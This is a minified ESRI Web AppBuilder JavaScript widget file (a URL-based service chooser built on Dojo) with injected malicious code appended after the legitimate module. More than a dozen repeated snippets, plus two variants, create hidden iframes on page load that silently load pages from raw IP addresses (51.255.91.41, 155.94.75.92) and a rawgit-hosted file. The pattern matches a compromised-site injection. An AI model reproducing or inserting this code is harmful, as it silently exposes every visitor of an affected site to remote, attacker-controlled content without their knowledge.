// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/_BasicServiceChooserContent.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"content-section"\x3e\r\n\t\t\x3ctable class\x3d"layout"\x3e\r\n\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\x3ccol width\x3d"80px" align\x3d"right"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\t\x3ccol width\x3d"170px"\x3e\x3c/col\x3e\r\n\t\t\t\x3c/colgroup\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\x3cspan\x3eURL:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"urlInput" data-dojo-type\x3d"jimu/dijit/URLInput" style\x3d"width:100%;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"jimu-btn jimu-state-disabled validate-btn jimu-float-trailing" data-dojo-attach-point\x3d"btnValidate" data-dojo-attach-event\x3d"onclick:_onBtnValidateClick"\x3e${nls.validate}\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\x3ctr data-dojo-attach-point\x3d"exampleTr" class\x3d"example-tr"\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"first-td" style\x3d"padding-top:5px;"\x3e\r\n\t\t\t\t\t\t\x3cspan\x3e${nls.example}:\x3c/span\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd data-dojo-attach-point\x3d"exampleTd" colspan\x3d"2" style\x3d"padding-top:5px;font-style:italic;color:#ccc;"\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\t\x3cdiv class\x3d"service-browser-container" data-dojo-attach-point\x3d"serviceBrowserContainer"\x3e\r\n\t\t\t\x3cdiv class\x3d"error-section" data-dojo-attach-point\x3d"errorSection"\x3e\r\n\t\t\t\t\x3cspan class\x3d"jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\r\n\t\t\t\t\x3cspan class\x3d"error-message" data-dojo-attach-point\x3d"errorNode"\x3e\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"operations"\x3e\r\n\t\t\x3cdiv class\x3d"jimu-btn jimu-float-trailing cancel jimu-btn-vacation" data-dojo-attach-event\x3d"onclick:_onBtnCancelClick"\x3e${nls.cancel}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-state-disabled ok" data-dojo-attach-point\x3d"btnOk" data-dojo-attach-event\x3d"onclick:_onBtnOkClick"\x3e${nls.ok}\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"loading" data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/_BasicServiceChooserContent.html dojo/Evented dojo/Deferred dojo/_base/html dojo/_base/array dojo/_base/lang dojo/on dojo/aspect dojo/promise/all jimu/dijit/URLInput jimu/dijit/LoadingIndicator".split(" "),function(f,g,h,k,l,m,e,c,n,d,p,q,r,t,u){return f([g,h,k,m],{templateString:l,_examples:["http://myserver/arcgis/rest/services","http://myserver/arcgis/rest/services/folder","http://myserver/arcgis/rest/services/myservice/servicetype"],
multiple:!1,url:"",getSelectedItems:function(){return this.serviceBrowser.getSelectedItems()},postMixInProperties:function(){this.nls=d.mixin({},window.jimuNls.common);this.nls=d.mixin(this.nls,window.jimuNls.basicServiceChooser)},postCreate:function(){this.inherited(arguments);c.addClass(this.domNode,"jimu-basic-service-chooser-content");this.multiple=!!this.multiple;this._initSelf();this.exampleTd.innerHTML=this.exampleTd.innerHTML},setUrl:function(a){var b=new e;(this.url=a)&&"string"===typeof this.url?
(this.urlInput.set("value",this.url),b=this._onBtnValidateClick()):b.reject();return b},focusInput:function(){this.urlInput.focus()},_initSelf:function(){this._examples&&0<this._examples.length?n.forEach(this._examples,d.hitch(this,function(a){c.create("div",{innerHTML:a,"class":"example-url"},this.exampleTd)})):c.setStyle(this.exampleTr,"display","none");var a={multiple:this.multiple,_onTreeClick:d.hitch(this,this._onTreeClick)};this.serviceBrowser=this._createServiceBrowser(a);this.serviceBrowser.placeAt(this.serviceBrowserContainer);
this.serviceBrowser.startup();this.own(q.after(this.urlInput,"validator",d.hitch(this,this._afterUrlValidate)));this.url&&"string"===typeof this.url&&this.urlInput.set("value",this.url);this.own(p(this.serviceBrowser,"error",d.hitch(this,this._onServiceBrowserError)))},_createServiceBrowser:function(a){},_validateUrl:function(a){a=a.replace(/\/*$/g,"");if((a=a.match(/\/rest\/services\/*(.*)/gi))&&0<a.length)if(a=a[0].replace(/\/rest\/services\/*/,"")){var b=a.split("/");if(1===b.length)return!0;if(2===
b.length)return this.serviceBrowser.isServiceTypeSupported(b[1]);if(3<=b.length)return a=this.serviceBrowser.isServiceTypeSupported(b[1]),b=this.serviceBrowser.isServiceTypeSupported(b[2]),a||b}else return!0;else return!1},_afterUrlValidate:function(a){a&&(a=this.urlInput.get("value"),a=this._validateUrl(a));a?c.removeClass(this.btnValidate,"jimu-state-disabled"):c.addClass(this.btnValidate,"jimu-state-disabled");return a},_onServiceBrowserError:function(a){this._showErrorMessage(a)},_showErrorMessage:function(a){a&&
"string"===typeof a?(this.errorNode.innerHTML=a,c.addClass(this.errorSection,"visible")):c.removeClass(this.errorSection,"visible")},_clearErrorMessage:function(){this.errorNode.innerHTML="";c.removeClass(this.errorSection,"visible")},_onBtnValidateClick:function(){this._clearErrorMessage();var a=new e;if(this.urlInput.validate()){var b=this.urlInput.get("value");this.serviceBrowser.setUrl(b).then(d.hitch(this,function(){this.domNode&&this._checkSelectedItemsNumber();a.resolve()}),d.hitch(this,function(){this.domNode&&
this._checkSelectedItemsNumber();a.reject()}));this.emit("validate-click")}else a.reject();return a},_checkSelectedItemsNumber:function(){0<this.getSelectedItems().length?c.removeClass(this.btnOk,"jimu-state-disabled"):c.addClass(this.btnOk,"jimu-state-disabled")},_onTreeClick:function(){this._checkSelectedItemsNumber()},_onBtnOkClick:function(){var a=this.getSelectedItems();0<a.length&&this.emit("ok",a)},_onBtnCancelClick:function(){this.emit("cancel")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});